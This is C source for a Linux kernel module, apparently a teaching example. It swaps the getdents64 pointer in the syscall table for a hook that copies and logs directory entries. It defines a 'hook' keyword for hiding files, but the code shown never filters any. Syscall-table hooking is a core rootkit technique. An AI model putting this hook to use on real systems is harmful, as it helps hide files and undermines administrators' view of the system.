#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/slab.h>

#include "my_memory.h"

#define IGNORE_TEXT "hook"                      //<- Text on file/dir to hide. If a file contains this text, hides it

static unsigned long *__sys_call_table;         //<- Pointer to the Kernel syscall table

asmlinkage long (*original_getdents64) (const struct pt_regs *regs);  //<- Original getdents64 syscall definition

asmlinkage int hooked_getdents64(const struct pt_regs *regs)
{
        struct linux_dirent64 __user * dirent = (struct linux_dirent64 *)regs->si;
        long values;                                              //<- Will store results for error checking
        struct linux_dirent64 * current_dir, * dirent_ker = NULL;
        unsigned long offset = 0;                                 //<- Offset used to point to the next linux_dirent64

        int ret = original_getdents64(regs);                      //<- Call the original getdents64 to get the linux_direntry-es
        if (ret <= 0) {                                           //<- Error checking
                pr_err("   Error calling original getdents64.\n");
                return ret;
        }

        dirent_ker = kzalloc(ret, GFP_KERNEL);                    //<- Reserve memory to copy the returned linux_direntry-es from previous line
        if (dirent_ker == NULL) {                                 //<- Error checking.
                pr_err("   Error allocating memory space.\n");
                return ret;
        }

        values = copy_from_user(dirent_ker, dirent, ret);         //<- Move from user space to kernel space
        if (values) {                                             //<- Error checking
                pr_err("   Error copying from user to kernel space.\n");
                return ret;
        }

        while (offset < ret)                                     //<- Loop while offset is not equal to direntries size
        {
                current_dir = (void *)dirent_ker + offset;       //<- We go increasing the value of current dir with
                                                                 //   offset, to point to the next direntry
                pr_info("   ENTRY: %s, size %d.\n", current_dir->d_name, current_dir->d_reclen);
                
                offset += current_dir->d_reclen;                 //<- Offset has to be increased by the size of the 
                                                                 //   actual direntry
        }

        values = copy_to_user(dirent, dirent_ker, ret);          //<- Results go to UserSpace
        if (values) {
                pr_err("    Error copying from kernel to user space.\n");
                return ret;
        }

        kfree(dirent_ker);                                       //<- Release reserved Kernel Space

        return ret;                                              //<- Return the size of all direntries
}


static int __init lkm_init(void)
{
        pr_info("Loading Module...\n");

        __sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");     //<- Get address for Kernel Syscall Table

        if (__sys_call_table == NULL) {                                         //<- Error Checking
                pr_err("  Can't find syscall table.\n");
                return -1;
        }

        original_getdents64 = (void *) __sys_call_table[__NR_getdents64];       //<- Save actual address for sys_shutdown

        my_memory_rw();         

        __sys_call_table[__NR_getdents64] = (unsigned long) hooked_getdents64;   //<- Replace the syscall pointer in the syscall table

        my_memory_ro();

        return 0;
}

static void __exit lkm_exit(void)
{
        pr_info("Exiting... Bye.\n");

        my_memory_rw();

        __sys_call_table[__NR_getdents64] = (unsigned long) original_getdents64;   //<- Restore Syscall table with original getdents64

        my_memory_ro();

}

module_init(lkm_init);           
module_exit(lkm_exit);          

MODULE_AUTHOR("Guillem Alminyana");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("LKM Hook Syscall Example");

